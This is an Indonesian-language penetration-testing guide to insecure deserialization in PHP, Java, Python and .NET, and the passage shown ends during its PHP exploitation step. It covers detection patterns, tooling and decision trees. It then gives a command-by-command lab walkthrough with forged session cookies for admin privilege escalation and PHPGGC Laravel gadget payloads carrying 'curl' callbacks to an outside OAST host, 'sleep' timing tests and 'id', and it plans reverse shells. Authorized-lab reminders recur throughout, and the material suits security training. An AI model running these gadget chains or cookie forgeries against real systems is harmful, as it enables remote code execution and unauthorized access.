
---

# 🔍 BAGIAN 5 — DETECTION WORKFLOW

# 5.1 Identify Serialized Data di Traffic

## 🕵️ Burp Suite

Cari serialized data di:

```
Cookies
Request body
Parameters
Headers
Multipart fields
Hidden fields
JWT-like blobs
Base64 values
Binary body
```

---

## 🔎 Pattern Search

Cari:

```
O:
a:
s:
AC ED 00 05
__VIEWSTATE
__EVENTVALIDATION
gAS
80 04
80 05
04 08
$type
```

---

## Burp History Workflow

```
Proxy
 ↓
HTTP history
 ↓
Filter relevant endpoint
 ↓
Request
 ↓
Inspect:
 ├── Cookie
 ├── Body
 ├── Parameter
 ├── Header
 └── Binary/Hex
```

---

# 🧪 Pattern Matching

Contoh:

```
session=O%3A4%3A%22User%22...
```

Decode:

```
O:4:"User"
```

Curiga PHP.

---

Contoh:

```
session=rO0ABXNy...
```

`rO0ABX` sering muncul jika Java serialized bytes di-Base64.

Decode:

```
# Decode kemungkinan Base64 Java object
echo 'rO0ABX...' | base64 -d | xxd
```

Cari:

```
ac ed 00 05
```

---

# 5.2 Out-of-Band Detection

## 🛰️ Prinsip

```
Client
  ↓
Serialized Payload
  ↓
Server
  ↓
Deserialization
  ↓
Gadget
  ↓
Network interaction
  ↓
OAST
```

---

# interactsh

```
# Jalankan interactsh
interactsh-client
```

Akan memberikan interaction URL/domain.

Gunakan domain unik:

```
deser-test-001.<OAST-DOMAIN>
```

---

# 🧪 OAST Per Platform

|Platform|Detection Idea|
|---|---|
|PHP|Gadget yang melakukan outbound interaction|
|Java|URLDNS|
|Python|`__reduce__` → controlled callback|
|.NET|gadget/property chain → controlled callback|
|XMLDecoder/XML|outbound interaction bila library/object mengizinkan|

---

# ✅ Confirm Execution

Kriteria kuat:

```
1. Payload accepted
2. Response behavior berubah
3. OAST callback diterima
4. Source berasal dari target
5. Timestamp cocok
6. Unique token cocok
```

---

# 5.3 Automated Detection

## Burp Scanner

Dapat membantu:

```
Passive analysis
Active scanning
Pattern recognition
Known deserialization indicators
```

Tetapi:

```
Scanner finding
   ≠
confirmed exploit
```

Manual validation tetap penting.

---

## Caido

Gunakan untuk:

```
Traffic inspection
Request replay
Search
Filtering
Payload manipulation
```

---

## Manual Pattern Matching

```
AC ED 00 05
O:
a:
s:
gAS
__VIEWSTATE
$type
```

Kemudian:

```
Decode
 ↓
Understand
 ↓
Confirm
 ↓
Exploit
```

---

# 🚀 BAGIAN 6 — EXPLOITATION WORKFLOW

# 6.1 PHP Path

```
ENUMERATE
   ↓
Find serialized-looking value
   ↓
Identify PHP serialization
   ↓
Base64/URL decode
   ↓
Identify class name
   ↓
Identify framework
   ↓
Find available gadget chains
   ↓
PHPGGC
   ↓
Harmless test
   ↓
OAST
   ↓
Command test
   ↓
Controlled RCE
   ↓
Reverse shell
```

---

## Detailed PHP Flow

### Step 1 — Enumerate

```
Cookies
Parameters
POST body
File/session data
```

### Step 2 — Decode

```
# URL decode/Base64 decode sesuai hasil analysis
printf '%s' '<VALUE>' | base64 -d
```

### Step 3 — Identify Framework

Cari:

```
Laravel
Symfony
Yii
Monolog
Guzzle
WordPress
Drupal
```

### Step 4 — PHPGGC

```
# List gadget chains
./phpggc -l

# Filter framework
./phpggc -l laravel
```

### Step 5 — Test OAST

```
unique-oast-token
      ↓
payload
      ↓
server
      ↓
callback?
```

### Step 6 — Command Test

Gunakan:

```
id
whoami
hostname
sleep
```

### Step 7 — Reverse Shell

Baru setelah:

```
deserialization confirmed
+
command execution confirmed
```

---

# 6.2 Java Path

```
Find binary/base64 blob
        ↓
Decode
        ↓
AC ED 00 05?
        ↓
Java serialization suspected
        ↓
URLDNS
        ↓
OAST callback
        ↓
Confirmed
        ↓
Identify Java version
        ↓
Identify dependencies
        ↓
Try compatible gadget
        ↓
Harmless command
        ↓
RCE
```

---

# 6.3 Universal Checklist

Sebelum exploit:

```
[ ] Target memang lab/authorized
[ ] Endpoint diketahui
[ ] Input source diketahui
[ ] Encoding diketahui
[ ] Serialization format identified
[ ] Deserialization sink identified
[ ] Application/framework identified
[ ] Version identified
[ ] Dependencies considered
[ ] Input validation checked
[ ] MAC/signature checked
[ ] Encryption checked
[ ] OAST domain unique
[ ] Harmless test prepared
[ ] Logging/response observed
[ ] Exploit impact understood
[ ] Rollback possible
[ ] No production testing
```

---

# 🧰 BAGIAN 7 — TOOLS MASTER LIST

|Tool|Bahasa Target|Fungsi|Install Command|Contoh Penggunaan|
|---|---|---|---|---|
|PHPGGC|PHP|Gadget chain generation|`git clone https://github.com/ambionics/phpggc.git`|`./phpggc -l`|
|ysoserial|Java|Java gadget chains|`git clone https://github.com/frohoff/ysoserial.git`|`java -jar ... URLDNS ...`|
|ysoserial.net|.NET|Gadget/ViewState payloads|Clone repository|`ysoserial -p ViewState ...`|
|marshalsec|Java/marshallers|Deserialization research|`git clone https://github.com/mbechler/marshalsec.git`|`java -cp ...`|
|interactsh|Multi-platform|OAST|`go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`|`interactsh-client`|
|Burp Deserialization Scanner|Web|Detection/testing|Burp extension/BApp|Scan request|
|SerializationDumper|Java|Parse serialized objects|Clone/build tool|Analyze `.bin`|
|jdeserialize|Java|Parse Object Serialization streams|Download/build jar|`java -jar jdeserialize.jar -help`|
|CyberChef|Multi|Decode/transform|Browser/local|Base64 → hex|
|xxd|Binary|Hex dump|`sudo apt install xxd`|`xxd payload.bin`|
|hexdump|Binary|Hex dump|Usually preinstalled|`hexdump -C file`|
|Burp Suite|Web|Proxy/replay/edit|Existing install|HTTP history|

> **Catatan:** PHPGGC mendukung output encoder seperti Base64 dan URL encoding.  
> `jdeserialize` dapat menganalisis Java Object Serialization tanpa menginstansiasi class dari stream, sehingga berguna untuk analysis terhadap stream dari sumber yang tidak dikenal.

---

# 🧰 Tool Installation — Parrot OS

## PHPGGC

```
# Clone repository
git clone https://github.com/ambionics/phpggc.git

# Masuk
cd phpggc

# Test
./phpggc -h
```

---

## ysoserial

```
# Clone
git clone https://github.com/frohoff/ysoserial.git

# Masuk
cd ysoserial

# Build
mvn clean package -DskipTests

# Cari jar
find target -name '*.jar'
```

---

## marshalsec

```
# Clone
git clone https://github.com/mbechler/marshalsec.git

# Masuk
cd marshalsec

# Build
mvn clean package -DskipTests
```

---

## interactsh

```
# Install melalui Go
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Tambahkan GOPATH/bin
export PATH="$PATH:$(go env GOPATH)/bin"

# Jalankan
interactsh-client
```

---

## jdeserialize

Tool `jdeserialize` adalah parser/analysis library untuk Java Object Serialization. Usage CLI dasarnya mendukung:

```
# Tampilkan bantuan
java -jar jdeserialize.jar -help
```

Project tersebut memang dirancang untuk menginterpretasikan Object Serialization streams dan menyediakan CLI untuk representasi object/value.

---

# 🌳 BAGIAN 8 — DECISION TREE

```
                         START
                           │
                           ▼
                  Inspect HTTP traffic
                           │
                           ▼
                 Serialized-looking data?
                     ┌─────┴─────┐
                    NO          YES
                     │            │
                     │            ▼
                     │      Decode / inspect
                     │            │
                     │            ▼
                     │     Identify format
                     │            │
          ┌──────────┼────────────┼──────────────┐
          │          │            │              │
          ▼          ▼            ▼              ▼
        PHP        Java        Pickle          .NET
          │          │            │              │
          ▼          ▼            ▼              ▼
       O:/a:/s:   AC ED 00 05   80 04/05      ViewState
          │          │            │            BinaryFormatter
          ▼          ▼            ▼            $type
        PHPGGC     URLDNS       pickle         ysoserial.net
          │          │         analysis            │
          ▼          ▼            │                ▼
       OAST       OAST            │            test config
          │          │            │                │
          ▼          ▼            ▼                ▼
      Confirm   Confirm       harmless         Confirm
          │          │            │                │
          └──────────┼────────────┼────────────────┘
                     │
                     ▼
                Identify sink
                     │
                     ▼
             Gadget chain available?
                 ┌───┴───┐
                NO      YES
                 │        │
                 ▼        ▼
          Stop / research  Select compatible
                            gadget
                               │
                               ▼
                         Harmless test
                               │
                               ▼
                         OAST / timing
                               │
                               ▼
                         Command execution
                               │
                               ▼
                              RCE
                               │
                               ▼
                         Controlled shell
```

---

# 🧯 BAGIAN 9 — COMMON ERRORS & TROUBLESHOOTING

|#|Error|Sebab|Solusi|
|---|---|---|---|
|1|`AC ED 00 05` tidak ditemukan|Payload mungkin Base64/URL encoded|Decode terlebih dahulu|
|2|PHP object rusak setelah edit|String length count salah|Hitung ulang byte length|
|3|`unserialize(): Error at offset`|Syntax serialized data rusak|Periksa colon/quote/count|
|4|PHPGGC payload ditolak|Framework/version mismatch|Identifikasi dependency|
|5|Gadget generated tapi no effect|Target tidak punya gadget dependency|Pilih chain lain|
|6|OAST tidak callback|Gadget tidak trigger|Coba detection vector yang benar|
|7|Callback berasal dari local machine|DNS terjadi saat payload generation|Gunakan unique domain dan cegah local resolution|
|8|Java `ClassNotFoundException`|Dependency target berbeda|Fingerprint dependency|
|9|`IncompatibleClassChangeError`|Version mismatch|Cari gadget kompatibel|
|10|URLDNS tidak callback|DNS caching/filtering/network restriction|Gunakan token baru / alternatif OAST|
|11|ViewState invalid|MAC aktif|Periksa MAC sebelum modification|
|12|ViewState decrypt gagal|Encryption aktif|Identifikasi konfigurasi lab|
|13|`$type` ditolak|TypeNameHandling tidak aktif|Konfirmasi deserializer config|
|14|Pickle payload gagal|Server bukan memakai pickle|Re-check format|
|15|`pickle.loads()` tidak trigger|Data wrapper/encoding berbeda|Trace decode path|
|16|`TypeError` saat pickle|`__reduce__` tidak valid|Pastikan return `(callable, args)`|
|17|Reverse shell tidak masuk|Egress firewall|Test callback/OAST dulu|
|18|Listener kosong|Wrong IP/port|Periksa interface/listener|
|19|HTTP body berubah oleh encoding|URL/Base64 mismatch|Send exact raw representation|
|20|Payload terlalu besar|Transport/server limit|Minify/alternative gadget|
|21|WAF block payload|Signature detected|First understand filtering; don't blindly mutate|
|22|Deserialization confirmed tetapi RCE tidak|Sink unreachable|Enumerate available gadgets|
|23|Server crash|Gadget malformed/state invalid|Revert to harmless test|
|24|Java payload generated tapi target silent|Wrong sink|Confirm `readObject()` path|
|25|Tool build gagal|Runtime/Maven/Java mismatch|Periksa Java/Maven version|

---

# 🧠 Troubleshooting Method

Jangan melakukan:

```
Payload gagal
   ↓
ganti payload secara random
   ↓
gagal
   ↓
ganti payload lagi
```

Gunakan:

```
INPUT
  ↓
FORMAT
  ↓
ENCODING
  ↓
DESERIALIZER
  ↓
CLASS
  ↓
DEPENDENCY
  ↓
MAGIC METHOD
  ↓
GADGET
  ↓
SINK
  ↓
EXECUTION
```

Satu tahap gagal → debug tahap tersebut.

---

# 🏆 BAGIAN 10 — GOLDEN RULES

## 🥇 Rule 01 — Serialized ≠ Vulnerable

```
Serialized data
≠
Deserialization vulnerability
```

---

## 🥇 Rule 02 — Deserialization ≠ RCE

```
unserialize()
readObject()
loads()

≠

automatic RCE
```

---

## 🥇 Rule 03 — Identify Format First

```
Decode
 ↓
Identify
 ↓
Exploit
```

Bukan:

```
Exploit
 ↓
hope payload works
```

---

## 🥇 Rule 04 — Gadget Chain Is Version Sensitive

```
Gadget
+
Dependency
+
Version
+
Runtime
=
Compatibility
```

---

## 🥇 Rule 05 — OAST Before RCE

```
Detection
 ↓
OAST
 ↓
Confirmation
 ↓
RCE
```

---

## 🥇 Rule 06 — Harmless Before Destructive

Mulai:

```
id
whoami
sleep
OAST
```

Bukan:

```
rm
chmod
persistence
destructive actions
```

---

## 🥇 Rule 07 — Decode Without Executing

Terutama:

```
pickle
Java
.NET
Ruby Marshal
```

Parsing ≠ safe execution.

---

## 🥇 Rule 08 — Length Counts Matter

PHP:

```
s:5:"admin";
```

harus benar-benar:

```
5 bytes
```

---

## 🥇 Rule 09 — Framework Recognition Saves Time

```
PHP serialized object
       ↓
Class name
       ↓
Framework
       ↓
Dependency
       ↓
Gadget
```

---

## 🥇 Rule 10 — Always Confirm the Sink

Jangan puas dengan:

```
"ada magic method"
```

Tanya:

```
magic method
    ↓
melakukan apa?
    ↓
memanggil apa?
    ↓
sink mana?
```

---

## 🥇 Rule 11 — Production Is Not a Lab

```
CTF / PortSwigger / HTB / Local Lab
       ✅

Unauthorized production target
       ❌
```

---

## 🥇 Rule 12 — Exploitability Has Layers

```
Detection
   ↓
Object manipulation
   ↓
Side effect
   ↓
OAST
   ↓
File/command primitive
   ↓
RCE
```

---

# ✅ BAGIAN 11 — FINAL CHECKLIST

```
[ ] 01. Target memiliki izin pengujian
[ ] 02. Endpoint ditemukan
[ ] 03. Input source ditemukan
[ ] 04. Serialized data ditemukan
[ ] 05. Encoding identified
[ ] 06. Format identified
[ ] 07. PHP/Java/Python/.NET/Ruby identified
[ ] 08. Deserializer identified
[ ] 09. Class/object structure understood
[ ] 10. Framework identified
[ ] 11. Dependency identified
[ ] 12. Version identified
[ ] 13. Magic method identified
[ ] 14. Gadget chain hypothesis dibuat
[ ] 15. Sink identified
[ ] 16. OAST prepared
[ ] 17. Unique interaction token dibuat
[ ] 18. Harmless test executed
[ ] 19. OAST callback verified
[ ] 20. Command execution tested
[ ] 21. Output/timing verified
[ ] 22. RCE confirmed
[ ] 23. Reverse shell hanya pada lab
[ ] 24. Listener verified
[ ] 25. Evidence captured
[ ] 26. Request saved
[ ] 27. Payload saved
[ ] 28. Response saved
[ ] 29. Impact documented
[ ] 30. Cleanup completed
```

---

# 🔗 BAGIAN 12 — CROSS-WORKFLOW

Deserialization jarang berdiri sendiri.

---

## 📁 File Upload ↔ Deserialization

Flow:

```
File Upload
    ↓
Serialized File
    ↓
Stored
    ↓
Server loads object
    ↓
Deserialization
    ↓
Gadget
    ↓
RCE
```

Pertanyaan:

```
Apakah upload menerima object file?
Apakah server memproses file setelah upload?
Apakah extension disamarkan?
Apakah file dimasukkan ke backend worker?
```

---

## 🌐 SSRF ↔ Deserialization

Gadget bisa memicu:

```
server-side network request
```

Flow:

```
Deserialization
      ↓
Gadget
      ↓
URL/network operation
      ↓
Internal service
```

Ini dapat berubah menjadi:

```
Deserialization
      +
SSRF
```

---

## 💣 XXE ↔ Deserialization

XML-based object reconstruction dapat berhubungan dengan:

```
XXE
XMLDecoder
XML object construction
```

Flow:

```
XML input
   ↓
Parser
   ↓
Object reconstruction
   ↓
Potential external entity / object behavior
```

---

## 💻 Command Injection ↔ Deserialization

Deserialization dapat menjadi **jalur masuk** menuju command execution.

```
Serialized Input
      ↓
Object
      ↓
Gadget
      ↓
Command invocation
      ↓
Command Injection / RCE primitive
```

---

## 🔥 RCE Chain

```
Recon
 ↓
Serialized input
 ↓
Deserialization
 ↓
Gadget
 ↓
OAST
 ↓
Command execution
 ↓
RCE
 ↓
Shell
 ↓
Post-exploitation
```

---

# 🧩 CROSS-WORKFLOW MAP

```
                ┌──────────────────┐
                │      RECON       │
                └────────┬─────────┘
                         │
                         ▼
                Serialized Input
                         │
        ┌────────────────┼─────────────────┐
        │                │                 │
        ▼                ▼                 ▼
   File Upload          SSRF              XXE
        │                │                 │
        └────────────────┼─────────────────┘
                         │
                         ▼
                  Deserialization
                         │
                         ▼
                    Gadget Chain
                         │
            ┌────────────┼────────────┐
            ▼            ▼            ▼
          OAST       File Action     Command
                                       │
                                       ▼
                                      RCE
                                       │
                                       ▼
                                     Shell
```

---

# 🧠 BAGIAN 13 — ONE-LINE MUSCLE MEMORY

```
Serialized Data
→ Decode
→ Identify Format
→ Identify Deserializer
→ Identify Framework
→ Identify Version/Dependencies
→ Find Magic Method/Gadget
→ Find Sink
→ OAST Detection
→ Harmless Command Test
→ Confirm Execution
→ RCE
→ Shell
```

---

# 🐘 PHP MUSCLE MEMORY

```
Find O:/a:/s:
→ URL/Base64 decode
→ read class name
→ identify framework
→ PHPGGC
→ OAST
→ id/whoami/sleep
→ RCE
→ shell
```

---

# ☕ JAVA MUSCLE MEMORY

```
AC ED 00 05
→ ObjectInputStream/readObject()
→ URLDNS
→ OAST callback
→ identify dependencies
→ compatible gadget
→ harmless command
→ RCE
```

---

# 🐍 PYTHON MUSCLE MEMORY

```
80 04 / 80 05 / gAS...
→ decode
→ pickle suspicion
→ inspect safely
→ loads()
→ __reduce__()
→ harmless callback
→ controlled execution
```

---

# 🟣 .NET MUSCLE MEMORY

```
__VIEWSTATE / BinaryFormatter / $type
→ decode
→ identify serializer
→ inspect MAC/encryption/type handling
→ identify framework/version
→ ysoserial.net
→ harmless verification
→ controlled execution
```

---

# 🌳 UNIVERSAL 10-SECOND DECISION

```
"Ini serialized data?"

       │
       ▼

PHP?
O:/a:/s:
       │
       └──→ PHPGGC

Java?
AC ED 00 05
       │
       └──→ URLDNS → OAST → Gadget

Python?
80 04 / 80 05 / gAS
       │
       └──→ pickle / __reduce__

.NET?
VIEWSTATE / $type / BinaryFormatter
       │
       └──→ ysoserial.net

Tidak yakin?
       │
       ▼
Decode → Hex → Identify → Trace sink
```

---

# 🧠 FINAL MINDSET

Jangan menghafal:

```
"Payload ini harus bekerja."
```

Hafalkan:

```
WHAT
 ↓
WHERE
 ↓
HOW
 ↓
WHY
```

### WHAT

```
Data apa yang dikirim?
```

### WHERE

```
Di mana data tersebut masuk ke deserializer?
```

### HOW

```
Bagaimana object dibentuk dan gadget berjalan?
```

### WHY

```
Bagaimana execution mencapai sink?
```

---

# 🎯 FINAL DESERIALIZATION MODEL

```
ATTACKER INPUT
      │
      ▼
 ENCODING LAYER
      │
      ▼
 SERIALIZED DATA
      │
      ▼
 DESERIALIZER
      │
      ▼
 OBJECT GRAPH
      │
      ▼
 MAGIC METHOD
      │
      ▼
 GADGET CHAIN
      │
      ▼
 DANGEROUS SINK
      │
      ▼
 SIDE EFFECT
      │
      ├── SSRF
      ├── File Operation
      ├── OAST
      ├── Command Execution
      └── RCE
```

> **Golden mental model:**  
> `Serialized Input → Deserializer → Object Graph → Gadget Chain → Sink → Impact`

---

# 📌 LAB SAFETY REMINDER

```
✅ PortSwigger Web Security Academy
✅ HTB
✅ Root-Me
✅ Local Docker/VM
✅ Custom vulnerable application
✅ CTF

❌ Production tanpa izin
❌ Third-party server tanpa izin
❌ Data milik orang lain
❌ Payload destructive pada target nyata
```

Deserialization adalah salah satu vulnerability class yang paling mudah disalahpahami karena menemukan serialized object hanya membuktikan **attack surface**, bukan otomatis membuktikan **RCE**. Fokus utama workflow adalah membangun rantai bukti:

```
INPUT
→ DESERIALIZER
→ OBJECT
→ GADGET
→ SINK
→ EFFECT
→ IMPACT
```

# 32 — Deserialization Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> ⚠️ **WARNING:** Hanya gunakan pada lab authorized (PortSwigger, HTB, THM, CTF, local lab). Deserialization exploit dapat menyebabkan crash, RCE, atau data loss pada production.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"          # IP target
export TARGET_URL="http://10.10.11.200"
export LHOST="10.10.14.5"            # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"

mkdir -p ~/deser_loot/{payloads,captures,oast,notes}
cd ~/deser_loot

# Setup tools direktori
export PHPGGC_PATH="$HOME/tools/phpggc"
export YSOSERIAL_JAR="$HOME/tools/ysoserial/target/ysoserial-all.jar"

echo "[*] Target: $TARGET | LHOST: $LHOST"
echo "[*] Payload dir: ~/deser_loot/payloads"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
[*] Payload dir: ~/deser_loot/payloads
```

---

## ═══════════════════════════════════════

## FASE 0: RECONNAISSANCE — TEMUKAN SERIALIZED DATA

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi apakah ada serialized data yang bisa dikontrol attacker. Ini HARUS dilakukan sebelum apapun.

### Langkah 0.1 — Scan HTTP Traffic di Burp (Lokasi Umum Serialized Data)

Bash

```
# Command 1: Ambil semua cookies dan headers dari target
curl -sv $TARGET_URL 2>&1 | grep -iE "(set-cookie|cookie|session|token|data|object)"

# Command 2: Cek semua endpoint yang mungkin menerima serialized data
curl -sv $TARGET_URL/login 2>&1 | grep -iE "(viewstate|__viewstate|session)"

# Command 3: Cari hidden fields di HTML yang sering jadi serialized container
curl -s $TARGET_URL | grep -iE "(hidden|viewstate|__eventvalidation|serialize)"

# Command 4: Cek semua cookies dari target
curl -c /tmp/cookies.txt -b /tmp/cookies.txt -s $TARGET_URL -o /dev/null
cat /tmp/cookies.txt
```

**LOKASI YANG HARUS DICEK DI BURP:**

text

```
Proxy → HTTP History → pilih setiap request → cek:
├── Tab "Cookies" → nilai cookie yang aneh/base64
├── Tab "Request" → body yang berisi binary/base64
├── Hidden fields di form (viewstate, dll)
├── API response yang berisi "type" field
└── Headers yang berisi object data
```

**OUTPUT BERHASIL ✅ — Cookie berisi serialized data (PHP):**

text

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=
```

**Decode untuk verifikasi:**

Bash

```
echo 'Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=' | base64 -d
```

text

```
O:4:"User":2:{s:4:"name";s:5:"admin";}
```

➡️ **PHP Serialized Object!** → Langsung ke **FASE 1 (PHP)**

---

**OUTPUT BERHASIL ✅ — Cookie berisi Java serialized data:**

text

```
Cookie: session=rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcA==
```

**Decode:**

Bash

```
echo 'rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcA==' | base64 -d | xxd | head -5
```

text

```
00000000: aced 0005 7372 0014 6a61 7661 2e75 7469  ....sr..java.uti
```

➡️ **`ac ed 00 05` = Java Object Serialization!** → Langsung ke **FASE 2 (Java)**

---

**OUTPUT BERHASIL ✅ — Cookie berisi Python pickle:**

text

```
Cookie: data=gASVHgAAAAAAAACMCHN1YnByb2Nlc3SUjARjYWxslJOUKYWUUpQu
```

**Decode:**

Bash

```
echo 'gASVHgAAAAAAAACMCHN1YnByb2Nlc3SUjARjYWxslJOUKYWUUpQu' | base64 -d | xxd | head -3
```

text

```
00000000: 8004 951e 0000 0000 0000 008c 0873 7562  .............sub
```

➡️ **`80 04` = Python Pickle!** → Langsung ke **FASE 3 (Python)**

---

**OUTPUT BERHASIL ✅ — ViewState di form ASP.NET:**

HTML

```
<input type="hidden" name="__VIEWSTATE" value="/wEPDwUJODcxNDI5MDkwZGQ=" />
```

➡️ **ASP.NET ViewState = .NET Deserialization potential!** → Langsung ke **FASE 4 (.NET)**

---

**OUTPUT GAGAL ❌ — Tidak ada serialized data yang obvious:**

text

```
Semua cookies berupa UUID atau JWT biasa
Tidak ada hidden field mencurigakan
```

➡️ Lakukan deeper inspection:

Bash

```
# Cari di semua response body
# Di Burp: Search → cari pattern "O:", "AC ED", "gAS", "__VIEWSTATE"

# Cek API endpoints yang mungkin accept serialized input
curl -s $TARGET_URL/api/v1/ -H "Content-Type: application/json" | python3 -m json.tool

# Cek file-file yang di-upload atau di-import
# Cari endpoint /import, /restore, /upload, /load
for path in /import /restore /upload /load /backup /export; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET_URL$path")
  echo "$path → $CODE"
done
```

---

### Langkah 0.2 — Identifikasi Format Serialized Data

Bash

```
# Quick identification script — jalankan ini untuk decode otomatis
COOKIE_VALUE="[paste_cookie_value_here]"

# Step 1: URL decode dulu
URL_DECODED=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$COOKIE_VALUE'))")
echo "URL Decoded: $URL_DECODED"

# Step 2: Base64 decode
echo "$URL_DECODED" | base64 -d 2>/dev/null | xxd | head -10

# Step 3: Cek magic bytes
echo "$URL_DECODED" | base64 -d 2>/dev/null | od -An -tx1 | head -1
```

**Tabel identifikasi cepat:**

|Pattern yang terlihat|Format|Tool|
|---|---|---|
|`O:`, `a:`, `s:`, `i:`|PHP serialize()|PHPGGC|
|`ac ed 00 05` (hex)|Java Object Serialization|ysoserial|
|`rO0AB` (base64 start)|Java Object Serialization (b64)|ysoserial|
|`80 04`, `80 05`, `gAS`|Python Pickle|Custom payload|
|`04 08` (hex)|Ruby Marshal|Custom payload|
|`__VIEWSTATE`|ASP.NET ViewState|ysoserial.net|
|`$type` dalam JSON|.NET JSON TypeNameHandling|ysoserial.net|

---

## ═══════════════════════════════════════

## FASE 1: PHP DESERIALIZATION

## ═══════════════════════════════════════

> **Prasyarat:** Ditemukan data dengan format `O:`, `a:`, `s:` dari Fase 0

### Langkah 1.1 — Decode & Analisis PHP Serialized Object

Bash

```
# Simpan nilai cookie yang ditemukan
PHP_COOKIE="Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30="

# Decode Base64
echo "$PHP_COOKIE" | base64 -d

# Jika URL-encoded, decode dulu
python3 -c "import urllib.parse; print(urllib.parse.unquote('$PHP_COOKIE'))" | base64 -d
```

**OUTPUT BERHASIL ✅ — PHP Object terlihat jelas:**

text

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

**Cara baca format PHP serialized:**

text

```
O:4:"User"   = Object, class name "User" (4 karakter)
:2:          = memiliki 2 properties
{
  s:4:"name"  = string property "name" (4 byte)
  s:5:"admin" = string value "admin" (5 byte)
  s:4:"role"  = string property "role" (4 byte)
  s:4:"user"  = string value "user" (4 byte)
}
```

➡️ **Catat class name: `User`** → Cari di source code atau error messages

---

### Langkah 1.2 — Simple Object Manipulation (Privilege Escalation)

Bash

```
# Test 1: Modifikasi role dari "user" ke "admin"
# PERHATIKAN: panjang byte HARUS sesuai!
# "user" = 4 byte, "admin" = 5 byte

# Original:
# s:4:"role";s:4:"user";

# Modified (admin = 5 byte):
MODIFIED_PAYLOAD='O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}'

# Encode ke Base64
ENCODED=$(echo -n "$MODIFIED_PAYLOAD" | base64)
echo "Payload: $ENCODED"

# Test dengan curl
curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=$ENCODED" \
  -L | grep -iE "(admin|welcome|dashboard|role)"
```

**OUTPUT BERHASIL ✅ — Role berubah, dapat akses admin:**

HTML

```
<h1>Welcome, Admin!</h1>
<a href="/admin/panel">Admin Panel</a>
```

➡️ **Object manipulation berhasil!** Explore admin panel lebih lanjut.

**OUTPUT GAGAL ❌ — Tetap user biasa atau error:**

text

```
HTTP 403 Forbidden
atau: "Invalid session"
atau: "Unserialize error"
```

➡️ Server mungkin melakukan validation atau mengecek dari database. Coba RCE via gadget chain → Langkah 1.3

---

### Langkah 1.3 — Setup PHPGGC untuk Gadget Chain

Bash

```
# Install PHPGGC
cd ~/tools
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Lihat semua gadget yang tersedia
./phpggc -l

# Cari gadget berdasarkan framework yang ditemukan
# Dari Langkah 0.1, cek technology stack:
./phpggc -l laravel    # Jika Laravel
./phpggc -l symfony    # Jika Symfony
./phpggc -l monolog    # Jika Monolog
./phpggc -l wordpress  # Jika WordPress
./phpggc -l yii        # Jika Yii
```

**OUTPUT BERHASIL ✅ — Gadget tersedia:**

text

```
Gadget Chains
-------------
Laravel/RCE1    [6.0.0 <= 6.1.0] (RCE) exec
Laravel/RCE2    [7.0.0 <= 8.x]   (RCE) system
Monolog/RCE1    [1.4.1, 1.6.0, 1.17.2] (RCE) system
Symfony/RCE1    [3.3] (RCE) exec
```

**OUTPUT GAGAL ❌ — Framework tidak ada di list:**

text

```
(tidak ada output yang sesuai)
```

➡️ Coba identifikasi framework dari error messages, HTTP headers, atau `/composer.json`, `/package.json`. Atau test semua gadget satu per satu.

---

### Langkah 1.4 — OOB Detection DULU (Sebelum RCE)

Bash

```
# Setup OAST server (interactsh)
# Terminal 1:
interactsh-client

# Atau gunakan Burp Collaborator (Burp Pro)
# Di Burp: Burp → Burp Collaborator client → Copy to clipboard

# Catat domain OAST kamu
export OAST_DOMAIN="UNIQUE_TOKEN.oast.fun"

# Generate PHPGGC payload dengan callback ke OAST
# Gunakan command yang trigger DNS/HTTP callback
cd ~/tools/phpggc

# Test dengan curl ke OAST (menggunakan gadget RCE yang tersedia)
./phpggc Laravel/RCE1 system "curl http://$OAST_DOMAIN" -b > ~/deser_loot/payloads/php_oast.b64

# Kirim payload
PAYLOAD=$(cat ~/deser_loot/payloads/php_oast.b64)
curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=$PAYLOAD" \
  -o /dev/null -w "%{http_code}\n"
```

**OUTPUT BERHASIL ✅ — OAST callback diterima:**

text

```
# Di terminal interactsh:
[INF] Received Interaction: HTTP from 10.10.11.200
Method: GET
Path: /
```

➡️ **CONFIRMED! Deserialization + RCE terbukti!** Lanjut ke Langkah 1.5.

**OUTPUT GAGAL ❌ — Tidak ada callback:**

text

```
(tidak ada di interactsh terminal)
```

➡️ Coba gadget chain yang berbeda:

Bash

```
# Coba gadget lain
./phpggc Laravel/RCE2 system "curl http://$OAST_DOMAIN" -b > ~/deser_loot/payloads/php_oast2.b64

# Coba timing-based detection (sleep)
./phpggc Laravel/RCE1 system "sleep 5" -b > ~/deser_loot/payloads/php_sleep.b64

# Ukur response time
time curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=$(cat ~/deser_loot/payloads/php_sleep.b64)" \
  -o /dev/null
```

Jika `sleep 5` menyebabkan delay ~5 detik → RCE ada tapi outbound blocked.

---

### Langkah 1.5 — PHP RCE Exploitation

Bash

```
# Step 1: Test harmless command dulu
cd ~/tools/phpggc
./phpggc Laravel/RCE1 system "id" -b > ~/deser_loot/payloads/php_id.b64

PAYLOAD=$(cat ~/deser_loot/payloads/php_id.b64)
curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=$PAYLOAD"
```

